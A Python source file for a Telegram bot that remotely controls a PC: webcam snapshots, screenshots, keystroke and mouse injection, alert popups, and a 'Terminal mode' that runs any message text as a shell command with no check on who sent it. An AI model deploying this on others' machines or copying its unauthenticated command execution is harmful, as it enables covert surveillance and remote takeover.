import cv2
from telebot import *
from telebot import types
from subprocess import run
import time
import os
import logging
from pyautogui import *
from datetime import datetime

# ---------------------------------
# VVV YOUR BOT TOKEN
token='YOUR BOT TOKEN HERE'
# ---------------------------------

logging.basicConfig(level=logging.INFO, filename="logs.log",filemode="w", format="%(asctime)s %(levelname)s %(message)s")
rlgs = " "
sysmode = 0
alertmode = 0
writemode = 0
alert = None
bot=telebot.TeleBot(token)

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("📸 Camera")
    item2 = types.KeyboardButton("🖥 Screenshot")
    item3 = types.KeyboardButton("⌨️ Keyboard")
    item4 = types.KeyboardButton("🖱 Mouse")
    item5 = types.KeyboardButton("📜 Logs")
    item6 = types.KeyboardButton("⚙️ Settings")
    markup.add(item1, item2, item3, item4, item5, item6)
    bot.send_message(message.chat.id, "📁 Select option:", reply_markup=markup)
@bot.message_handler(func=lambda message: message.text == "📸 Camera")

def button1(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    current_datetime = datetime.now()
    print("CAMERA @" + str(message.from_user.username))
    write_data_time = str(current_datetime)
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite("camera1.png", frame)
    cap.release()
    logging.info("CAMERA @" + str(message.from_user.username))
    photo = open('camera1.png', 'rb')
    bot.send_photo(message.chat.id, photo)
    photo.close()

@bot.message_handler(func=lambda message: message.text == "🖥 Screenshot")
def button2(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    current_datetime = datetime.now()
    write_data_time = str(current_datetime)
    print(write_data_time + " SCREENSHOT @" + str(message.from_user.username))
    screenshot("screen.png")
    scre = open('screen.png', 'rb')
    logging.info("SCREENSHOT @" + str(message.from_user.username))
    bot.send_photo(message.chat.id, scre)

@bot.message_handler(func=lambda message: message.text == "⌨️ Keyboard")
def button3(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item31 = types.KeyboardButton("⌨️ Enter")
    item32 = types.KeyboardButton("⌨️ Backspace")
    item33 = types.KeyboardButton("⌨️ Escape")
    item34 = types.KeyboardButton("⌨️ Alt+Tab")
    item35 = types.KeyboardButton("⌨️ Windows+L")
    item36 = types.KeyboardButton("⚙️ Text mode")
    backb = types.KeyboardButton("◀️ Back")
    markup.add(item31, item32, item33, item34, item35, item36,backb)
    bot.send_message(message.chat.id, "📁 Keyboard: Select option:", reply_markup=markup)
@bot.message_handler(func=lambda message: message.text == "⌨️ Enter")
def button4(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    press("enter")
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨️ Backspace")
def button5(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    press("backspace")
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨️ Escape")
def button6(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    press("esc")
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨️ Alt+Tab")
def button7(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    hotkey('alt', 'tab')
    bot.send_message(message.chat.id, "✅ Success!")
@bot.message_handler(func=lambda message: message.text == "⌨️ Windows+L")
def button8(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    hotkey('win', 'l')
    bot.send_message(message.chat.id, "✅ Success!")
@bot.message_handler(func=lambda message: message.text == "⚙️ Text mode")
def button9(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    if writemode == 1:
        writemode = 0
        bot.send_message(message.chat.id, "⌨️ Text mode: OFF")
    else:
        writemode = 1
        bot.send_message(message.chat.id, "⌨️ Text mode: ON")
@bot.message_handler(func=lambda message: message.text == "◀️ Back")
def button10(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    start(message)
@bot.message_handler(func=lambda message: message.text == "🖱 Mouse")
def button11(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item31 = types.KeyboardButton("🖱 Click")
    item32 = types.KeyboardButton("🖱 Double click")    
    backb = types.KeyboardButton("◀️ Back")
    markup.add(item31, item32,backb)
    bot.send_message(message.chat.id, "📁 Mouse: Select option:", reply_markup=markup)
@bot.message_handler(func=lambda message: message.text == "🖱 Click")
def button12(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    click()
@bot.message_handler(func=lambda message: message.text == "🖱 Double click")
def button13(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    doubleClick()
@bot.message_handler(func=lambda message: message.text == "📜 Logs")
def button14(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    logf = open("logs.log", "r")
    for line in logf:
        try:
            bot.send_message(message.chat.id, logf.readlines())
            if logf.readlines() == "":
                bot.send_message(message.chat.id, "❌ Логи пустые")
        except:
            x = 6
@bot.message_handler(func=lambda message: message.text == "⚙️ Settings")
def button15(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item61 = types.KeyboardButton("🛡️ Terminal mode")
    item62 = types.KeyboardButton("📢 Alert mode")
    item63 = types.KeyboardButton("🌐 Language")
    backb = types.KeyboardButton("◀️ Back")
    markup.add(item61, item62, item63,backb)
    bot.send_message(message.chat.id, "📁 Keyboard: Select option:", reply_markup=markup)
@bot.message_handler(func=lambda message: message.text == "🌐 Language")
def button16(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    bot.send_message(message.chat.id, "🌐 Language will be soon...")
@bot.message_handler(func=lambda message: message.text == "🛡️ Terminal mode")
def button17(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    if sysmode == 1:
        sysmode = 0
        bot.send_message(message.chat.id, "🛡️ Terminal mode: OFF")
    else:
        sysmode = 1
        bot.send_message(message.chat.id, "🛡️ Terminal mode: ON")
@bot.message_handler(func=lambda message: message.text == "📢 Alert mode")
def button18(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    if alertmode == 1:
        alertmode = 0
        bot.send_message(message.chat.id, "📢 Alert mode: OFF")
    else:
        alertmode = 1
        bot.send_message(message.chat.id, "📢 Alert mode: ON")

@bot.message_handler(content_types='text')
def message_reply(message1):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    if alertmode == 1:
        alert(message1.text)
        bot.send_message(message1.chat.id, "📢 Success!")
    elif writemode == 1:
        write(message1.text, interval=0.0001)
        bot.send_message(message1.chat.id, "⌨️ Success!")
    elif sysmode == 1:
        a = os.popen(message1.text).readlines()
        bot.send_message(message1.chat.id, f"🛡️ {a}")
bot.infinity_polling(none_stop=True)
